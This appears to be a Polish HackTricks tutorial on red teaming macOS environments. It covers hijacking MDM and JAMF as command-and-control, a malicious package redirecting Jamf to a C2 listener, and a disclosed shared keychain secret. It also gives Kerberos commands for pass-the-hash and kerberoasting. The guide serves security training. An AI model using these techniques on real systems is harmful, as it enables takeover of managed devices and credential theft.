# Red Teaming w macOS

{{#include ../../banners/hacktricks-training.md}}


## Nadużywanie MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Jeśli uda Ci się **przejąć dane uwierzytelniające administratora** i uzyskać dostęp do platformy zarządzania, możesz **potencjalnie przejąć wszystkie komputery**, rozpowszechniając malware na tych urządzeniach.

Podczas red teamingu w środowiskach MacOS zdecydowanie warto poznać zasadę działania MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Używanie MDM jako C2

MDM będzie mieć uprawnienia do instalowania, odpytywania lub usuwania profili, instalowania aplikacji, tworzenia lokalnych kont administratora, ustawiania hasła firmware, zmieniania klucza FileVault...

Aby uruchomić własny MDM, musisz **uzyskać podpis swojego CSR od dostawcy**. Możesz spróbować zrobić to za pomocą [**https://mdmcert.download/**](https://mdmcert.download/). Do uruchomienia własnego MDM dla urządzeń Apple możesz użyć [**MicroMDM**](https://github.com/micromdm/micromdm).

Zapisanie urządzenia do MDM nie powoduje **automatycznie**, że certyfikat TLS serwera zarządzającego staje się zaufanym CA ani nie nadaje tożsamości do podpisywania aplikacji. Jeśli serwer używa prywatnego CA, jego certyfikaty główny i pośrednie muszą zostać dostarczone w profilu rejestracji lub osobnym profilu zaufania. Tożsamość klienta używana do uwierzytelniania MDM jest oparta na innym certyfikacie.<sup>[[7]](#references)</sup>

Pobrany profil rejestracji MDM (`.mobileconfig`) należy otworzyć i zatwierdzić w **Ustawienia systemowe → Ogólne → Zarządzanie urządzeniami**. Samo umieszczenie go w pliku `.pkg` zainstalowanym jako root lub w pliku ZIP otwartym w Safari nie spowoduje cichego zapisania współczesnego Maca do MDM. Zobacz [działanie profili konfiguracji](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Automatyczna rejestracja urządzeń podczas Asystenta ustawień to osobny proces. Informacje o innych wymaganiach wstępnych znajdziesz w artykule [nieautoryzowana rejestracja urządzenia należącego do innej organizacji](macos-mdm/enrolling-devices-in-other-organisations.md).<sup>[[9]](#references)</sup>

**Agent Mythic Orthrus** wykorzystuje tę technikę.

### Wdrażanie pakietu za pośrednictwem kontrolowanego MDM

Na **nadzorowanym Macu z systemem macOS 26 lub nowszym** kontrola nad usługą MDM pozwala użyć deklaracji `com.apple.configuration.package` w zakresie systemowym.<sup>[[10]](#references)</sup> Pakiet musi mieć podpis, który urządzenie może zweryfikować, ale jego aplikacja nie wymaga osobnego podpisu Developer ID: Gatekeeper nie sprawdza aplikacji instalowanych za pośrednictwem zarządzania urządzeniami.<sup>[[11]](#references)</sup> Zaufany certyfikat TLS serwera sam w sobie nie daje operatorowi klucza prywatnego ani uprawnień do podpisywania wymaganych dla podpisu pakietu.<sup>[[11]](#references)[[12]](#references)</sup>

Utwórz podpisany pakiet testowy, oblicz jego skrót i opublikuj zarówno pakiet, jak i plik plist `ManifestURL` przez HTTPS. Manifest musi zawierać jeden zasób `software-package` z jego URL-em i SHA-256, a także unikatowe wartości `bundle-identifier` i `bundle-version`.<sup>[[11]](#references)</sup> Następnie wyślij deklarację pakietu z adresem URL manifestu i ustawieniem `InstallBehavior.Install` na `Required`; sprawdź element stanu `package.list`, aby potwierdzić instalację lub wykryć błędy.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Minimalna deklaracja wymaganej instalacji, przesłana za pośrednictwem usługi MDM, wygląda następująco (zastąp URL i oba identyfikatory UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Nadużywanie JAMF PRO

JAMF może uruchamiać **custom scripts** (skrypty opracowane przez administratora systemu), **native payloads** (tworzenie kont lokalnych, ustawianie hasła EFI, monitorowanie plików/procesów...) oraz **MDM** (konfiguracje urządzeń, certyfikaty urządzeń...).<sup>[[5]](#references)</sup>

#### Samodzielna rejestracja w JAMF

Przejdź na stronę taką jak `https://<company-name>.jamfcloud.com/enroll/`, aby sprawdzić, czy **samodzielna rejestracja jest włączona**. Jeśli tak, strona może **poprosić o dane logowania**.

Możesz użyć skryptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py), aby przeprowadzić atak password spraying.

Ponadto po znalezieniu prawidłowych danych logowania możesz być w stanie przeprowadzić brute-force innych nazw użytkowników za pomocą poniższego formularza:

![Nadużywanie JAMF PRO - Samodzielna rejestracja w JAMF: Ponadto po znalezieniu prawidłowych danych logowania możesz być w stanie przeprowadzić brute-force innych nazw użytkowników za pomocą poniższego formularza](<../../images/image (107).png>)

#### Uwierzytelnianie urządzeń JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Plik binarny **`jamf`** zawierał sekret służący do otwierania keychaina, który w chwili odkrycia był **wspólny** dla wszystkich i miał wartość: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Ponadto jamf **utrzymuje trwałość** jako **LaunchDaemon** w **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Przejęcie urządzenia JAMF

**URL** serwera **JSS** (Jamf Software Server), z którego będzie korzystać **`jamf`**, znajduje się w **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ten plik zawiera zasadniczo URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Zatem atakujący mógłby umieścić złośliwy pakiet (`pkg`), który podczas instalacji **nadpisze ten plik**, ustawiając **URL listenera Mythic C2 dla agenta Typhon**, aby móc nadużywać JAMF jako C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### Podszywanie się pod JAMF

Aby **podszyć się pod komunikację** między urządzeniem a JMF, potrzebujesz:

- **UUID** urządzenia: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **pęku kluczy JAMF** z lokalizacji: `/Library/Application\ Support/Jamf/JAMF.keychain`, który zawiera certyfikat urządzenia

Mając te informacje, **utwórz VM** ze **skradzionym** Hardware **UUID** i wyłączonym **SIP**, umieść **pęk kluczy JAMF**, **podłącz hook** do **agenta** Jamf i wykradnij jego informacje.

#### Kradzież sekretów

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Możesz też monitorować lokalizację `/Library/Application Support/Jamf/tmp/` w poszukiwaniu **niestandardowych skryptów**, które administratorzy mogą chcieć uruchomić za pośrednictwem Jamf. Są tam **umieszczane, uruchamiane, a następnie usuwane**. Te skrypty **mogą zawierać dane uwierzytelniające**.

Jednak **dane uwierzytelniające** mogą być przekazywane tym skryptom jako **parametry**, więc trzeba monitorować `ps aux | grep -i jamf` (nawet bez uprawnień root).

Skrypt [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) może nasłuchiwać na pojawienie się nowych plików i nowych argumentów procesów.

### Zdalny dostęp do macOS

Oraz „specjalne” **protokoły** **sieciowe** systemu **macOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Czasami okaże się, że **komputer z macOS jest podłączony do AD**. W takim przypadku spróbuj przeprowadzić **enumerację** Active Directory tak, jak zwykle. Pomoc znajdziesz na następujących stronach:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Przydatnym **lokalnym narzędziem macOS** może być również `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Dostępne są również narzędzia przygotowane dla MacOS, które automatycznie enumerują AD i umożliwiają pracę z kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound to rozszerzenie narzędzia Bloodhound do audytu, umożliwiające zbieranie i importowanie informacji o relacjach w Active Directory z hostów MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost to projekt Objective-C zaprojektowany do współpracy z API Heimdal krb5 w macOS. Jego celem jest umożliwienie dokładniejszych testów bezpieczeństwa Kerberos na urządzeniach macOS przy użyciu natywnych API, bez konieczności instalowania dodatkowych frameworków ani pakietów na urządzeniu docelowym.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Narzędzie JavaScript for Automation (JXA) do enumeracji Active Directory.

### Informacje o domenie

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Użytkownicy

Istnieją trzy typy użytkowników systemu macOS:

- **Użytkownicy lokalni** — zarządzani przez lokalną usługę OpenDirectory; nie są w żaden sposób połączeni z Active Directory.
- **Użytkownicy sieciowi** — efemeryczni użytkownicy Active Directory, którzy do uwierzytelnienia wymagają połączenia z serwerem DC.
- **Użytkownicy mobilni** — użytkownicy Active Directory, których dane uwierzytelniające i pliki mają lokalną kopię zapasową.

Lokalne informacje o użytkownikach i grupach są przechowywane w folderze _/var/db/dslocal/nodes/Default._\
Na przykład informacje o użytkowniku o nazwie _mark_ są przechowywane w _/var/db/dslocal/nodes/Default/users/mark.plist_, a informacje o grupie _admin_ — w _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Oprócz krawędzi HasSession i AdminTo **MacHound dodaje trzy nowe krawędzie** do bazy danych Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** — podmiot może łączyć się z hostem przez SSH
- **CanVNC** — podmiot może łączyć się z hostem przez VNC
- **CanAE** — podmiot może wykonywać skrypty AppleEvent na hoście

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Więcej informacji: [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Hasło Computer$

Uzyskaj hasła za pomocą:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Możliwe jest uzyskanie dostępu do hasła **`Computer$`** w pęku kluczy System.

### Over-Pass-The-Hash

Uzyskaj TGT dla konkretnego użytkownika i usługi:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Po zebraniu TGT można wstrzyknąć go do bieżącej sesji za pomocą:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Mając uzyskane service tickets, można spróbować uzyskać dostęp do udziałów na innych komputerach:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Uzyskiwanie dostępu do Keychain

Keychain prawdopodobnie zawiera poufne informacje, które po uzyskaniu do nich dostępu bez wywoływania monitu mogą pomóc w dalszym prowadzeniu ćwiczenia Red Team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Usługi zewnętrzne

Red Teaming MacOS różni się od typowego Red Teaming w Windows, ponieważ **MacOS jest zwykle bezpośrednio zintegrowany z kilkoma platformami zewnętrznymi**. Częsta konfiguracja MacOS umożliwia dostęp do komputera za pomocą **zsynchronizowanych poświadczeń OneLogin oraz dostęp do kilku usług zewnętrznych** (takich jak github, aws...).

## Różne techniki Red Team

### Safari

Gdy plik zostanie pobrany w Safari, jeśli jest „bezpieczny”, zostanie **automatycznie otwarty**. Na przykład, jeśli **pobierzesz plik zip**, zostanie on automatycznie rozpakowany:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Zbieranie jabłek: Red Teaming środowisk MacOS w 2021 r. - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Przedstawiamy MacHound: rozwiązanie do ataków na macOS oparte na Active Directory](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Polecenia enumeracji domeny (odpowiedniki dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Przejdź na ciemną stronę, mamy jabłka: złowrogie wykorzystanie zarządzania macOS](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: „Perspektywa atakujących na konfiguracje Jamf” - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Wykrywanie Active Directory na Macu - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Zarządzanie certyfikatami usług zarządzania urządzeniami i urządzeń](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Korzystanie z profili konfiguracji na Macu](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Wdrażanie profili rejestracji zarządzania urządzeniami](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Deklaracja pakietu](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Instalowanie pakietów](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Tożsamości](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
